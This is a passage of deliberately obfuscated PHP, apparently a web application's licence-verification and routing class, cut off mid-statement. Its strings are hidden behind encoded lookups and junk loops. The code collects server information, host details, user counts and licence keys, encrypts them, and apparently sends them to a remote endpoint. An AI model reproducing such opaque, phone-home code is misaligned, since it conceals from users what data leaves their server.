$ÂÚ¨Ô½ö =& $_SERVER[…É¦À–]; $óœ‡•ØÂ =& $_SERVER[…Ğİ€¤†]; $àö˜Œ¥Ì = $óœ‡•ØÂ[4]; $¢Îù¼ÔÀ = $GLOBALS[$óœ‡•ØÂ[13]][$óœ‡•ØÂ[14]][0]; if (!$¢Îù¼ÔÀ || strlen($¢Îù¼ÔÀ) <= strlen($àö˜Œ¥Ì)) { return; } if (strtolower(substr($¢Îù¼ÔÀ, -strlen($àö˜Œ¥Ì))) != $àö˜Œ¥Ì) { return; } $Ëõ£”Õ¢ = substr($¢Îù¼ÔÀ, 0, -strlen($àö˜Œ¥Ì)); $Ûšİá›“ = array($óœ‡•ØÂ[4], $Ëõ£”Õ¢); $»Ô‹Á¶¼ = array_slice($GLOBALS[$óœ‡•ØÂ[13]][$óœ‡•ØÂ[14]], 1); $­ãóèğ“ = $ÂÚ¨Ô½ö[648]; while ($­ãóèğ“ < $ÂÚ¨Ô½ö[647]) { if ($­ãóèğ“ >= 0) { break; } $­ãóèğ“++; } $GLOBALS[$óœ‡•ØÂ[13]][$óœ‡•ØÂ[14]] = array_merge($Ûšİá›“, $»Ô‹Á¶¼); $GLOBALS[$óœ‡•ØÂ[13]][$óœ‡•ØÂ[15]] = implode($óœ‡•ØÂ[0], $GLOBALS[$óœ‡•ØÂ[13]][$óœ‡•ØÂ[14]]); $†îôúç‰ = $ÂÚ¨Ô½ö[649]; while (strlen($†îôúç‰) < $ÂÚ¨Ô½ö[650]) { if (!$†îôúç‰) { break; } $†îôúç‰++; } } private function yetm4296adb5() { $¹¡šš¬‘ =& $_SERVER[…É¦À–]; $¾¦òşŒ =& $_SERVER[…Ğİ€¤†]; if ($GLOBALS[$¾¦òşŒ[13]][$¾¦òşŒ[15]] != $¾¦òşŒ[6]) { return; } $’éÅÅª = $_SERVER[$¾¦òşŒ[16]]; $ÖÇùÍÃ = $¹¡šš¬‘[651]; while (strlen($ÖÇùÍÃ) < $¹¡šš¬‘[647]) { if (!$ÖÇùÍÃ) { break; } $ÖÇùÍÃ++; } $ØÀÉìì— = $¾¦òşŒ[17]; if (!strstr($’éÅÅª, $ØÀÉìì—)) { return; } $¹ÖĞ àü = strrpos($’éÅÅª, $ØÀÉìì—); $Ôşèœá = $¹¡šš¬‘[652]; $ŸŠô®íÏ = substr($’éÅÅª, $¹ÖĞ àü + strlen($ØÀÉìì—)); preg_match_all($¾¦òşŒ[18], $ŸŠô®íÏ, $¤±Ñ»); $ÏŒ«“Ç = $¹¡šš¬‘[653]; while (strlen($ÏŒ«“Ç) < $¹¡šš¬‘[642]) { if (!$ÏŒ«“Ç) { break; } $ÏŒ«“Ç++; } $ŸŠô®íÏ = trim($¤±Ñ»[0][0], $¾¦òşŒ[19]); $GLOBALS[$¾¦òşŒ[13]][$¾¦òşŒ[14]] = explode($¾¦òşŒ[19], $ŸŠô®íÏ); $GLOBALS[$¾¦òşŒ[13]][$¾¦òşŒ[15]] = implode($¾¦òşŒ[0], $GLOBALS[$¾¦òşŒ[13]][$¾¦òşŒ[14]]); } public function run() { $¹îøò†Ú =& $_SERVER[…É¦À–]; $ÎŞÛ€Â… =& $_SERVER[…Ğİ€¤†]; $this->yetm4296adb5(); $óÃ›Ãô² = $¹îøò†Ú[654]; $this->qbez85fb841e(); $Ïí—¬¯Â = $¹îøò†Ú[655]; if (!$Ïí—¬¯Â) { die; } $—î÷ğóş = $GLOBALS[$ÎŞÛ€Â…[13]][$ÎŞÛ€Â…[14]]; $ĞªÌĞ† = $¹îøò†Ú[656]; $ö¯Ííƒ¤ = $GLOBALS[$ÎŞÛ€Â…[13]][$ÎŞÛ€Â…[15]]; $‡±¬ò = $¹îøò†Ú[657]; while ($‡±¬ò < $¹îøò†Ú[650]) { if ($‡±¬ò >= 0) { break; } $‡±¬ò++; } define($ÎŞÛ€Â…[20], isset($—î÷ğóş[0]) && $—î÷ğóş[0] ? $—î÷ğóş[0] : $this->defaultModule); define($ÎŞÛ€Â…[21], isset($—î÷ğóş[1]) && $—î÷ğóş[0] ? $—î÷ğóş[1] : $this->defaultController); define($ÎŞÛ€Â…[22], isset($—î÷ğóş[2]) && $—î÷ğóş[0] ? $—î÷ğóş[2] : $this->defaultAction); define($ÎŞÛ€Â…[23], MOD . $ÎŞÛ€Â…[0] . ST . $ÎŞÛ€Â…[0] . ACT); $_SERVER[$ÎŞÛ€Â…[24]] = strtolower(ACTION); $ƒ“ˆ‘üÍ = $¹îøò†Ú[658]; while ($ƒ“ˆ‘üÍ < $¹îøò†Ú[640]) { if ($ƒ“ˆ‘üÍ >= 0) { break; } $ƒ“ˆ‘üÍ++; } $this->autorun(); if (count($—î÷ğóş) >= 3) { $this->appRun($ö¯Ííƒ¤); } else { $this->appRun(ACTION); } } private $nlez33831e20 = array(); private $qsnp1c315e64 = ''; public function nmac9a5f51a0() { $‚üª‚£‚ =& $_SERVER[…É¦À–]; $¯ßËÎáç =& $_SERVER[…Ğİ€¤†]; $this->wpgf76cfe5aa(); $this->ifgq11e9d16d(); $ÑŒè¡şë = $‚üª‚£‚[659]; if (!$ÑŒè¡şë) { return; } $this->poel7326b46d(); $ñİşô•¬ = $‚üª‚£‚[660]; if (!$ñİşô•¬) { return; } $this->nrgm24c0f980(); $æ©Ë«Ö² = $‚üª‚£‚[661]; while ($æ©Ë«Ö² < $‚üª‚£‚[640]) { if ($æ©Ë«Ö² >= 0) { break; } $æ©Ë«Ö²++; } $this->elqibe7f5c27(); $¬ÉõÓöû = $‚üª‚£‚[662]; $this->jfra792ace4c(); $Œ®†¸Èá = $‚üª‚£‚[663]; if (!$Œ®†¸Èá) { die; } $this->sgki46c66b44(); $this->mdytb48a91de($¯ßËÎáç[25], array($this, $¯ßËÎáç[26])); $ùúò•ş = $‚üª‚£‚[664]; while (strlen($ùúò•ş) < $‚üª‚£‚[640]) { if (!$ùúò•ş) { break; } $ùúò•ş++; } $this->mdytb48a91de($¯ßËÎáç[27], array($this, $¯ßËÎáç[28])); $ÂÙĞ°ÚÛ = $‚üª‚£‚[665]; $this->mdytb48a91de($¯ßËÎáç[29], array($this, $¯ßËÎáç[30])); $ÁÍ¢ùåø = $‚üª‚£‚[666]; if (strlen($ÁÍ¢ùåø) < $‚üª‚£‚[642]) { die; } $this->mdytb48a91de($¯ßËÎáç[31], array($this, $¯ßËÎáç[32])); $ùÎœæû§ = $‚üª‚£‚[667]; if (!$ùÎœæû§) { return; } } public function filt603c10dc($È é©İÉ) { $àŸ¨Âª =& $_SERVER[…É¦À–]; $ÎÈèïº¯ =& $_SERVER[…Ğİ€¤†]; $°Û”¢ê = Model($ÎÈèïº¯[33])->get(); $º…­ñüá = array($ÎÈèïº¯[34], $ÎÈèïº¯[35], $ÎÈèïº¯[36], $ÎÈèïº¯[37], $ÎÈèïº¯[38], $ÎÈèïº¯[39], $ÎÈèïº¯[40], $ÎÈèïº¯[41], $ÎÈèïº¯[42], $ÎÈèïº¯[43], $ÎÈèïº¯[44], $ÎÈèïº¯[45], $ÎÈèïº¯[46], $ÎÈèïº¯[47], $ÎÈèïº¯[48], $ÎÈèïº¯[49], $ÎÈèïº¯[50], $ÎÈèïº¯[51], $ÎÈèïº¯[52], $ÎÈèïº¯[53], $ÎÈèïº¯[54], $ÎÈèïº¯[55], $ÎÈèïº¯[56], $ÎÈèïº¯[57], $ÎÈèïº¯[58], $ÎÈèïº¯[59], $ÎÈèïº¯[60], $ÎÈèïº¯[61], $ÎÈèïº¯[62], $ÎÈèïº¯[63], $ÎÈèïº¯[64], $ÎÈèïº¯[65], $ÎÈèïº¯[66], $ÎÈèïº¯[67], $ÎÈèïº¯[68], $ÎÈèïº¯[69], $ÎÈèïº¯[70], $ÎÈèïº¯[71], $ÎÈèïº¯[72], $ÎÈèïº¯[73], $ÎÈèïº¯[74], $ÎÈèïº¯[75], $ÎÈèïº¯[76], $ÎÈèïº¯[77], $ÎÈèïº¯[78], $ÎÈèïº¯[79], $ÎÈèïº¯[80], $ÎÈèïº¯[81], $ÎÈèïº¯[82], $ÎÈèïº¯[83], $ÎÈèïº¯[84]); $•£¬æ«İ = $àŸ¨Âª[668]; if (strlen($•£¬æ«İ) < $àŸ¨Âª[642]) { return; } foreach ($º…­ñüá as $í˜üêà) { $Éõ¦º“ = $GLOBALS[$ÎÈèïº¯[85]][$ÎÈèïº¯[86]][$í˜üêà]; $ê®¹ŞâÂ = $àŸ¨Âª[669]; if (strlen($ê®¹ŞâÂ) < $àŸ¨Âª[640]) { die; } if (isset($°Û”¢ê[$í˜üêà])) { $Éõ¦º“ = $°Û”¢ê[$í˜üêà]; } $È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[88]][$í˜üêà] = $Éõ¦º“; } $ŞÂò”½Ş = $È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[88]][$ÎÈèïº¯[46]]; $äÒó î = $àŸ¨Âª[670]; if (strlen($äÒó î) < $àŸ¨Âª[636]) { die; } unset($È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[89]][$ÎÈèïº¯[90]]); unset($È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[89]][$ÎÈèïº¯[91]]); $¡ãŒ³¨Ò = $àŸ¨Âª[671]; if (strlen($¡ãŒ³¨Ò) < $àŸ¨Âª[640]) { return; } unset($È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[88]][$ÎÈèïº¯[46]]); $¥¡Ÿƒó = $àŸ¨Âª[672]; unset($È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[88]][$ÎÈèïº¯[92]]); $È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[88]][$ÎÈèïº¯[93]] = array($ÎÈèïº¯[94] => (int) $ŞÂò”½Ş[$ÎÈèïº¯[95]], $ÎÈèïº¯[96] => (int) _get($ŞÂò”½Ş, $ÎÈèïº¯[97], 0)); $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[99]] = Action($ÎÈèïº¯[100])->accessToken(); $îÏÍóÃ = $àŸ¨Âª[673]; while (strlen($îÏÍóÃ) < $àŸ¨Âª[636]) { if (!$îÏÍóÃ) { break; } $îÏÍóÃ++; } $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[101]] = md5($_SERVER[$ÎÈèïº¯[102]] . $°Û”¢ê[$ÎÈèïº¯[103]]); $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[104]] = base64_encode(serverInfo()); $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[105]] = $this->qsnp1c315e64; $µ¿ğ²¥Ô = $àŸ¨Âª[674]; if (strlen($µ¿ğ²¥Ô) < $àŸ¨Âª[636]) { die; } if ($°Û”¢ê[$ÎÈèïº¯[105]] != $ÎÈèïº¯[106]) { $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[107]] = $°Û”¢ê[$ÎÈèïº¯[107]]; $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[108]] = $°Û”¢ê[$ÎÈèïº¯[108]]; $¬˜±ˆî» = rand_string(10) . $this->qsnp1c315e64 . rand_string(5); $È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[109]][$ÎÈèïº¯[110]] = $this->ermp7daecf04($¬˜±ˆî», $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[101]]); } if ($this->qsnp1c315e64 == $ÎÈèïº¯[106]) { $È é©İÉ[$ÎÈèïº¯[87]][$ÎÈèïº¯[88]][$ÎÈèïº¯[93]][$ÎÈèïº¯[97]] = 0; } $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[111]] = _get($this->nlez33831e20, $ÎÈèïº¯[112], $ÎÈèïº¯[6]); $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[113]] = _get($this->nlez33831e20, $ÎÈèïº¯[114], $ÎÈèïº¯[6]); $—½¼Û­ = $àŸ¨Âª[675]; if (_get($GLOBALS, $ÎÈèïº¯[115]) && $this->config[$ÎÈèïº¯[116]]) { $È é©İÉ[$ÎÈèïº¯[98]][$ÎÈèïº¯[117]] = WEB_ROOT; } return $È é©İÉ; } private function jfra792ace4c() { $ìÉ¢³˜¤ =& $_SERVER[…É¦À–]; $ÏÙ±‰Ë© =& $_SERVER[…Ğİ€¤†]; $Ë“×¢µ = $_SERVER[$ÏÙ±‰Ë©[24]] == $ÏÙ±‰Ë©[118]; if ($_SERVER[$ÏÙ±‰Ë©[24]] == $ÏÙ±‰Ë©[119] && $_GET[$ÏÙ±‰Ë©[120]] == $ÏÙ±‰Ë©[121]) { $Ë“×¢µ = !0; } if ($Ë“×¢µ) { $œ¸ıüø— = array($ÏÙ±‰Ë©[105] => $this->qsnp1c315e64, $ÏÙ±‰Ë©[122] => $this->xwysfea6faf4(), $ÏÙ±‰Ë©[123] => Model($ÏÙ±‰Ë©[124])->count()); if ($this->qsnp1c315e64 != $ÏÙ±‰Ë©[106]) { $Ñšàæí = _get($this->nlez33831e20, $ÏÙ±‰Ë©[125]); if ($Ñšàæí) { $œ¸ıüø—[$ÏÙ±‰Ë©[126]] = $Ñšàæí; $œ¸ıüø—[$ÏÙ±‰Ë©[127]] = strtotime(_get($this->nlez33831e20, $ÏÙ±‰Ë©[128])); $œ¸ıüø—[$ÏÙ±‰Ë©[129]] = _get($this->nlez33831e20, $ÏÙ±‰Ë©[114]); } $ê„ÜÆÄ‹ = Model($ÏÙ±‰Ë©[33])->get($ÏÙ±‰Ë©[130], $ÏÙ±‰Ë©[6], !0); if (is_string($ê„ÜÆÄ‹) && substr($ê„ÜÆÄ‹, 0, 1) == $ÏÙ±‰Ë©[131]) { $ê„ÜÆÄ‹ = json_decode_force($ê„ÜÆÄ‹); } if (is_array($ê„ÜÆÄ‹) && $ê„ÜÆÄ‹[$ÏÙ±‰Ë©[132]] && strstr($ê„ÜÆÄ‹[$ÏÙ±‰Ë©[132]], $ÏÙ±‰Ë©[133])) { $³ñ‘éå = explode($ÏÙ±‰Ë©[133], $ê„ÜÆÄ‹[$ÏÙ±‰Ë©[132]]); $œ¸ıüø—[$ÏÙ±‰Ë©[134]] = $³ñ‘éå[0]; } } $œ¸ıüø— = $this->vjmfded6646f(json_encode($œ¸ıüø—), md5($ÏÙ±‰Ë©[135])); $üâ‡€áº = $ìÉ¢³˜¤[676]; if (strlen($üâ‡€áº) < $ìÉ¢³˜¤[642]) { return; } $‡ÑÜ¨Éü = array($ÏÙ±‰Ë©[136] => $œ¸ıüø—); $´‘æŞíœ = $ìÉ¢³˜¤[677]; if (strlen($´‘æŞíœ) < $ìÉ¢³˜¤[650]) { die; } call_user_func(array($ÏÙ±‰Ë©[137], $ÏÙ±‰Ë©[138]), $‡ÑÜ¨Éü); $™â€¼¥ = $ìÉ¢³˜¤[678]; if (strlen($™â€¼¥) < $ìÉ¢³˜¤[647]) { return; } } if ($this->qsnp1c315e64 == $ÏÙ±‰Ë©[106]) { return; } $âßß®ŞÎ = array($ÏÙ±‰Ë©[139], $ÏÙ±‰Ë©[140], $ÏÙ±‰Ë©[141], $ÏÙ±‰Ë©[142], $ÏÙ±‰Ë©[143], $ÏÙ±‰Ë©[144]); $®É¢É« = Model($ÏÙ±‰Ë©[33])->get(); $‡ÑÜ¨Éü = array($ÏÙ±‰Ë©[145] => $®É¢É«[$ÏÙ±‰Ë©[34]], $ÏÙ±‰Ë©[146] => $®É¢É«[$ÏÙ±‰Ë©[35]], $ÏÙ±‰Ë©[147] => $ÏÙ±‰Ë©[6]); $§º§ˆĞ = $ìÉ¢³˜¤[679]; while ($§º§ˆĞ < $ìÉ¢³˜¤[636]) { if ($§º§ˆĞ >= 0) { break; } $§º§ˆĞ++; } foreach ($âßß®ŞÎ as $©¸ì¹÷í) { if (!isset($®É¢É«[$©¸ì¹÷í]) || !$®É¢É«[$©¸ì¹÷í]) { continue; } $‡ÑÜ¨Éü[$©¸ì¹÷í] = $®É¢É«[$©¸ì¹÷í]; } call_user_func(array($ÏÙ±‰Ë©[137], $ÏÙ±‰Ë©[138]), $‡ÑÜ¨Éü); $ÉòÍƒó = $ìÉ¢³˜¤[680]; if (!$ÉòÍƒó) { die; } } private function nrgm24c0f980() { $«°Êàî =& $_SERVER[…É¦À–]; $²´ôù =& $_SERVER[…Ğİ€¤†]; if ($_SERVER[$²´ôù[24]] != $²´ôù[148]) { return; } if (!_get($GLOBALS, $²´ôù[115])) { die; } $ö›äĞª¸ = $GLOBALS[$²´ôù[13]]; if (isset($ö›äĞª¸[$²´ôù[149]])) { $this->gbkv3a262de4(); die; } if (!isset($ö›äĞª¸[$²´ôù[150]]) || strlen($ö›äĞª¸[$²´ôù[150]]) != 16) { show_json($²´ôù[151] . $ö›äĞª¸[$²´ôù[150]], !1); } $¶¨Åğ®È = Model($²´ôù[33])->get($²´ôù[103]); $ùóç·¹÷ = md5($_SERVER[$²´ôù[102]] . $¶¨Åğ®È); $Ó¿£µ†Ã = $«°Êàî[681]; while (strlen($Ó¿£µ†Ã) < $«°Êàî[640]) { if (!$Ó¿£µ†Ã) { break; } $Ó¿£µ†Ã++; } $ƒşè¤ü— = array($²´ôù[150] => $ö›äĞª¸[$²´ôù[150]], $²´ôù[152] => rand_string(16), $²´ôù[153] => $²´ôù[135], $²´ôù[154] => $²´ôù[155], $²´ôù[156] => $_SERVER[$²´ôù[157]], $²´ôù[158] => $_SERVER[$²´ôù[159]], $²´ôù[160] => $_SERVER[$²´ôù[161]], $²´ôù[101] => $ùóç·¹÷, $²´ôù[162] => Model($²´ôù[33])->get($²´ôù[130])); $ì³ü÷ÑÁ = $«°Êàî[682]; if ($ö›äĞª¸[$²´ôù[163]] == $²´ôù[164]) { $ãÈ…ÛÅ¨ = $this->vjmfded6646f($ùóç·¹÷, $²´ôù[165]); $¾Òş· = $this->ermp7daecf04(json_encode($ƒşè¤ü—), $ùóç·¹÷ . $²´ôù[166], 3); $¾Òş· = $¾Òş· . $²´ôù[167] . $_SERVER[$²´ôù[157]]; $ûÏ…û¢ = $this->mulvf0e08d1a($²´ôù[168] . $ãÈ…ÛÅ¨ . $²´ôù[169] . $¾Òş·, -1); show_json($ûÏ…û¢, !0); } else { if ($ö›äĞª¸[$²´ôù[163]] == $²´ôù[170]) { $±ß¨ÜºÑ = substr(md5($²´ôù[171] . $ùóç·¹÷), 12, 15) . $²´ôù[172]; $¾Òş· = $this->lqzv982662d2(trim($ö›äĞª¸[$²´ôù[173]]), $±ß¨ÜºÑ, 2); $·µÏ„ÃÌ = json_decode($¾Òş·, !0); if (!is_array($·µÏ„ÃÌ) || !is_array($·µÏ„ÃÌ[$²´ôù[174]]) || $·µÏ„ÃÌ[$²´ôù[150]] != !0) { $äÙ’ šä = $²´ôù[175]; $ĞıóÖ³˜ = $·µÏ„ÃÌ[$²´ôù[174]] ? $²´ôù[176] . $·µÏ„ÃÌ[$²´ôù[174]] : $äÙ’ šä; show_json($ĞıóÖ³˜, !1); } else { $ƒşè¤ü—[$²´ôù[152]] = $·µÏ„ÃÌ[$²´ôù[174]][$²´ôù[177]]; } } else { $·µÏ„ÃÌ = $this->mulvf0e08d1a($²´ôù[178], $ƒşè¤ü—, 10); $óñµ…ƒë = $«°Êàî[683]; if (strlen($óñµ…ƒë) < $«°Êàî[642]) { return; } } } if (!is_array($·µÏ„ÃÌ) || !is_array($·µÏ„ÃÌ[$²´ôù[174]]) || $·µÏ„ÃÌ[$²´ôù[150]] != !0) { $äÙ’ šä = LNG($²´ôù[179]); $ĞıóÖ³˜ = $·µÏ„ÃÌ[$²´ôù[174]] ? $²´ôù[176] . $·µÏ„ÃÌ[$²´ôù[174]] : $äÙ’ šä; show_json($ĞıóÖ³˜, !1); } $Ó­êÍİ = $·µÏ„ÃÌ[$²´ôù[174]]; $É™Êû«î = $this->mpkre478bbfc($Ó­êÍİ[$²´ôù[180]]); $ğ¾™­è¿ = $«°Êàî[684]; while (strlen($ğ¾™­è¿) < $«°Êàî[647]) { if (!$ğ¾™­è¿) { break; } $ğ¾™­è¿++; } if (!$É™Êû«î || $É™Êû«î != $Ó­êÍİ[$²´ôù[128]]) { $‰ßüÒ = array($²´ôù[181] => Model($²´ôù[33])->get($²´ôù[103]), $²´ôù[182] => $_SERVER[$²´ôù[102]], $²´ôù[183] => this_url(), $²´ôù[158] => $_SERVER[$²´ôù[159]]); $¾Òş· = $this->amtp0c1cb831(json_encode($‰ßüÒ)); $this->mulvf0e08d1a($²´ôù[184] . $¾Òş·); show_json(LNG($²´ôù[185]), !0); } $¿Œº£Ç« = array($²´ôù[186] => $Ó­êÍİ[$²´ôù[187]], $²´ôù[188] => $Ó­êÍİ[$²´ôù[189]], $²´ôù[190] => rand_string(16), $²´ôù[105] => $Ó­êÍİ[$²´ôù[191]]); if ($ƒşè¤ü—[$²´ôù[152]]) { $¿Œº£Ç«[$²´ôù[190]] = $ƒşè¤ü—[$²´ôù[152]]; } $óšâ ÷ü = substr(md5($¿Œº£Ç«[$²´ôù[188]]), 10, 10); $¾Ø¾Ş±à = $óšâ ÷ü . $¿Œº£Ç«[$²´ôù[105]] . $¿Œº£Ç«[$²´ôù[190]]; $¿Œº£Ç«[$²´ôù[107]] = strrev(base64_encode($this->vjmfded6646f($¾Ø¾Ş±à, $²´ôù[192]))); $şëÑ–ß = rand_string(16); $³‘“ûÖ¶ = $şëÑ–ß . $¿Œº£Ç«[$²´ôù[105]] . $this->vjmfded6646f(md5($¿Œº£Ç«[$²´ôù[186]]), $şëÑ–ß); $Â°ŒÜá¤ = $«°Êàî[685]; $¿Œº£Ç«[$²´ôù[108]] = base64_encode(strrev($this->vjmfded6646f($³‘“ûÖ¶, $²´ôù[193]))); if ($Ó­êÍİ[$²´ôù[194]] && $Ó­êÍİ[$²´ôù[194]] >= 1) { Model($²´ôù[33])->setDeep($²´ôù[195], $²´ôù[121]); } Model($²´ôù[33])->set($¿Œº£Ç«); $²Ìõ¤×€ = md5($_SERVER[$²´ôù[102]] . strrev($¶¨Åğ®È) . $¿Œº£Ç«[$²´ôù[188]]); $ã°¨ÌÑ = $«°Êàî[686]; if (!$ã°¨ÌÑ) { return; } $î“ßö³ = strrev(substr($²Ìõ¤×€, 10, 16)); $µ¾°öş¥ = $«°Êàî[687]; if (!$µ¾°öş¥) { die; } $»æ•Ø‚® = $this->ermp7daecf04(json_encode($Ó­êÍİ), $²Ìõ¤×€); $ÊÃÕæ¾ú = $«°Êàî[688]; while (strlen($ÊÃÕæ¾ú) < $«°Êàî[636]) { if (!$ÊÃÕæ¾ú) { break; } $ÊÃÕæ¾ú++; } $ØíÑ÷ò = array_to_keyvalue(Model($²´ôù[7])->listData(), $²´ôù[196]); $ °¾ùÌù = $«°Êàî[689]; $±÷¡Æı’ = $ØíÑ÷ò[$²´ôù[197]]; $ï¥¸€¢İ = array(); $ıà˜èéé = $«°Êàî[690]; $ï¥¸€¢İ[$î“ßö³] = $»æ•Ø‚®; Model($²´ôù[7])->update($±÷¡Æı’[$²´ôù[198]], array($²´ôù[199] => $ï¥¸€¢İ)); $this->nlez33831e20 = $Ó­êÍİ; $this->qsnp1c315e64 = $¿Œº£Ç«[$²´ôù[105]]; $à“¼æ¨Í = $«°Êàî[691]; if (!$à“¼æ¨Í) { return; } $this->licenseRegistSuccess(); Cache::set($²´ôù[200] . md5($¶¨Åğ®È . $²´ôù[201]), $²´ôù[6]); $ñ¡Œºş = $«°Êàî[692]; show_json(LNG($²´ôù[185]), !0); $ôÊğ‘ê¯ = $«°Êàî[693]; if (!$ôÊğ‘ê¯) { die; } } private function licenseRegistSuccess() { $–ø•ü·¯ =& $_SERVER[…Ğİ€¤†]; $²¸¶ğ­¿ = Model($–ø•ü·¯[33])->get(); if ($²¸¶ğ­¿[$–ø•ü·¯[63]] != $–ø•ü·¯[121]) { Model($–ø•ü·¯[33])->set($–ø•ü·¯[63], $–ø•ü·¯[121]); } Action($–ø•ü·¯[202])->initStart(!0); } private function gbkv3a262de4() { $ïü‡ÉÌ÷ =& $_SERVER[…É¦À–]; $ÓÚ–Û„Ü =& $_SERVER[…Ğİ€¤†]; Model($ÓÚ–Û„Ü[33])->set(array($ÓÚ–Û„Ü[186] => $ÓÚ–Û„Ü[6], $ÓÚ–Û„Ü[188] => $ÓÚ–Û„Ü[6], $ÓÚ–Û„Ü[105] => $ÓÚ–Û„Ü[106], $ÓÚ–Û„Ü[107] => $ÓÚ–Û„Ü[6], $ÓÚ–Û„Ü[108] => $ÓÚ–Û„Ü[6])); Model($ÓÚ–Û„Ü[33])->setDeep($ÓÚ–Û„Ü[195], $ÓÚ–Û„Ü[203]); $î÷”ø˜ = $ïü‡ÉÌ÷[694]; $this->nlez33831e20 = array(); $¡ˆ»İœ› = $ïü‡ÉÌ÷[695]; if (strlen($¡ˆ»İœ›) < $ïü‡ÉÌ÷[636]) { die; } $this->qsnp1c315e64 = $ÓÚ–Û„Ü[106]; } private function wpgf76cfe5aa() { $Ş½” ÚÁ =& $_SERVER[…É¦À–]; $®¢õâ¬è =& $_SERVER[…Ğİ€¤†]; $_SERVER[$®¢õâ¬è[159]] = _get($_SERVER, $®¢õâ¬è[159], APP_HOST); $òª‡È±· = $Ş½” ÚÁ[696]; if (strlen($òª‡È±·) < $Ş½” ÚÁ[640]) { return; } $this->qsnp1c315e64 = $®¢õâ¬è[106]; $êÖ»•é› = Model($®¢õâ¬è[33])->get(); $¦§Æº´ê = $Ş½” ÚÁ[697]; if ($êÖ»•é›[$®¢õâ¬è[105]] == $®¢õâ¬è[106]) { return; } $Ğ­ÁŞŞ´ = Model($®¢õâ¬è[33])->get($®¢õâ¬è[103]); $€úÒ¿äÓ = $®¢õâ¬è[200] . md5($Ğ­ÁŞŞ´ . $®¢õâ¬è[201]); $«î½±»Ä = Cache::get($€úÒ¿äÓ); $õÆ†‚¼» = $Ş½” ÚÁ[698]; if (strlen($õÆ†‚¼») < $Ş½” ÚÁ[642]) { return; } if (!is_array($«î½±»Ä) || !isset($«î½±»Ä[$®¢õâ¬è[204]]) || time() - $«î½±»Ä[$®¢õâ¬è[204]] >= 60) { $Õôáª¶ = Model($®¢õâ¬è[7])->loadList(); $ü‘•§¼Ä = $Õôáª¶[$®¢õâ¬è[197]]; $Şş£Çˆ„ = md5($_SERVER[$®¢õâ¬è[102]] . strrev($Ğ­ÁŞŞ´) . $êÖ»•é›[$®¢õâ¬è[188]]); $ïãÄ®ì‘ = strrev(substr($Şş£Çˆ„, 10, 16)); $«î½±»Ä = $this->lqzv982662d2($ü‘•§¼Ä[$®¢õâ¬è[85]][$ïãÄ®ì‘], $Şş£Çˆ„); $«î½±»Ä = json_decode($«î½±»Ä, !0); } if (!is_array($«î½±»Ä)) { return $this->gbkv3a262de4(); } $¼ïõ¿­á = strtotime($«î½±»Ä[$®¢õâ¬è[128]]); if (time() >= $¼ïõ¿­á) { return $this->gbkv3a262de4(); } if (time() - $«î½±»Ä[$®¢õâ¬è[204]] > 20) { $«î½±»Ä[$®¢õâ¬è[204]] = time(); Cache::set($€úÒ¿äÓ, $«î½±»Ä); } $this->nlez33831e20 = $«î½±»Ä; $this->qsnp1c315e64 = $êÖ»•é›[$®¢õâ¬è[105]]; $£åÄŠ¼ = $Ş½” ÚÁ[699]; while ($£åÄŠ¼ < $Ş½” ÚÁ[640]) { if ($£åÄŠ¼ >= 0) { break; } $£åÄŠ¼++; } } private function ifgq11e9d16d() { $úĞ”à× =& $_SERVER[…É¦À–]; $¨˜šˆÒ =& $_SERVER[…Ğİ€¤†]; $Ã®ÍÆ´À = $GLOBALS[$¨˜šˆÒ[13]]; $×”Ê¦°÷ = $úĞ”à×[700]; $‰¾á´ô÷ = $_SERVER[$¨˜šˆÒ[24]]; $ÊÀ…°² = $úĞ”à×[701]; while (strlen($ÊÀ…°²) < $úĞ”à×[640]) { if (!$ÊÀ…°²) { break; } $ÊÀ…°²++; } if ($‰¾á´ô÷ == $¨˜šˆÒ[205] && $this->qsnp1c315e64 == $¨˜šˆÒ[106]) { show_json(LNG($¨˜šˆÒ[206]), !1, $¨˜šˆÒ[207]); } $ªºİÔâŸ = array($¨˜šˆÒ[208], $¨˜šˆÒ[209]); if (in_array($‰¾á´ô÷, $ªºİÔâŸ)) { if ($this->qsnp1c315e64 == $¨˜šˆÒ[106] && isset($Ã®ÍÆ´À[$¨˜šˆÒ[210]])) { show_json(LNG($¨˜šˆÒ[206]), !1, $¨˜šˆÒ[207]); die; } $Ô…—¢ö = $this->xwysfea6faf4(); if ($Ô…—¢ö != intval($¨˜šˆÒ[211])) { if ($Ô…—¢ö <= Model($¨˜šˆÒ[124])->count()) { show_json(LNG($¨˜šˆÒ[212]), !1, $¨˜šˆÒ[207]); die; } } } } private function poel7326b46d() { $§œ½Èº¿ =& $_SERVER[…É¦À–]; $Ï·ôª“é =& $_SERVER[…Ğİ€¤†]; $ç‘¡¯è— = array($Ï·ôª“é[118], $Ï·ôª“é[119]); if (!_get($GLOBALS, $Ï·ôª“é[115]) || !isset($_GET[$Ï·ôª“é[213]])) { return; } if (!in_array($_SERVER[$Ï·ôª“é[24]], $ç‘¡¯è—)) { return; } $ ÃÕŒ•ü = $Ï·ôª“é[214]; $›±ï‹ŞÒ = $§œ½Èº¿[702]; while (strlen($›±ï‹ŞÒ) < $§œ½Èº¿[642]) { if (!$›±ï‹ŞÒ) { break; } $›±ï‹ŞÒ++; } $ ÃÕŒ•ü = $this->htdn550fea25($ ÃÕŒ•ü, $Ï·ôª“é[215]); $¢ù§ßËº = $§œ½Èº¿[703]; if (!$¢ù§ßËº) { die; } $ğ˜éÁ = stream_context_create(array($Ï·ôª“é[216] => array($Ï·ôª“é[217] => $Ï·ôª“é[218], $Ï·ôª“é[219] => 